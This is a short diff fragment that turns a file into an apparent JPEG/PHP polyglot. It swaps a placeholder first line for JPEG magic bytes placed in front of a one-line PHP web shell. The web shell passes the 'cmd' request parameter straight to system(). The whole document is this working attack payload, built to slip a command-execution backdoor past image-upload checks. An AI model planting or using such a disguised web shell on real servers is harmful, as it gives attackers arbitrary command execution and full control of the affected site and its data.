@@ -1,4 +1,4 @@
-AAAAAA
+ÿØÿ
 
 <?php
 echo system($_GET["cmd"]);
